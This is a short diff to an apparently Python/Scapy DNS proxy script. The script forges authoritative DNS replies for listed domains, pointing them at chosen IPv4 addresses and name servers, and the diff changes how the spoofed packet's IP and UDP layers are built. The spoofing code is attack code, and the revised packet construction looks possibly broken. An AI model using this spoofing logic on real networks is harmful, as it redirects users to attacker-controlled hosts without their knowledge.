@@ -33,7 +33,7 @@ def send_to_server(dns_ip, query):
     return data
 
 def handler(data, addr, socket, dns_ip):
-    print "Received request from client"
+    print "Received request from client\n", data
     server_response = send_to_server(dns_ip, data)
     print "Received response from DNS server"
     if server_response:
@@ -47,8 +47,8 @@ def handler(data, addr, socket, dns_ip):
             if url in to_be_spoofed:
                 print "Request for %s will be spoofed" % url[:-1]
                 print "Original\n", original_dns_packet.show()
-                spoofed_dns_packet = IP(dst=original_dns_packet[IP].dst, src=original_dns_packet[IP].src) /\
-                    UDP(dport=original_dns_packet[UDP].dport, sport=original_dns_packet[UDP].sport) /\
+                spoofed_dns_packet = IP(server_response[2:]) /\
+                    UDP(server_response[2:]) /\
                     DNS(id=original_dns_packet[DNS].id, qr=1, aa=1, qd=original_dns_packet[DNS].qd,
                     an=DNSRR(rrname=original_dns_packet[DNS].qd.qname, ttl=original_dns_packet[DNS].an.ttl,rdata=to_be_spoofed[url]['ipv4']),
                     ns=DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns']))
